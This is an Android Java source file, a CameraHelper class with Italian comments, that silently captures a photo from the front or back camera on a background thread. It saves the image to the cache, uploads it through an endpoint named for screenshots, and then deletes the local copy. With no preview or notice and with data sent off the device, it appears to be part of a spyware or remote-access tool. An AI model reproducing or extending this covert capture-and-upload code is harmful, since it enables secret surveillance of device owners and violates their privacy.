package com.nexus.app;

import android.content.Context;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;

public class CameraHelper {
    private final Context ctx;
    private final NexusAPI api;

    public CameraHelper(Context ctx, NexusAPI api) {
        this.ctx = ctx;
        this.api = api;
    }

    public void takePhoto(String which) {
        new Thread(() -> {
            Camera camera = null;
            try {
                int cameraId = findCamera(which);
                if (cameraId < 0) return;

                camera = Camera.open(cameraId);
                Camera.Parameters params = camera.getParameters();
                List<Camera.Size> sizes = params.getSupportedPictureSizes();
                // Prendi risoluzione media per velocità
                Camera.Size size = sizes.get(sizes.size() / 2);
                params.setPictureSize(size.width, size.height);
                camera.setParameters(params);

                final Camera cam = camera;
                final File outFile = new File(ctx.getCacheDir(), 
                    "photo_" + which + "_" + System.currentTimeMillis() + ".jpg");

                cam.takePicture(null, null, (data, c) -> {
                    try {
                        FileOutputStream fos = new FileOutputStream(outFile);
                        fos.write(data);
                        fos.close();
                        api.uploadScreenshot(outFile); // riusa endpoint screenshot
                    } catch (Exception e) { e.printStackTrace(); }
                    finally { cam.release(); if (outFile.exists()) outFile.delete(); }
                });

                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
                if (camera != null) try { camera.release(); } catch (Exception ex) {}
            }
        }).start();
    }

    private int findCamera(String which) {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if ("front".equals(which) && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
            if ("back".equals(which) && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i;
        }
        return -1;
    }
}
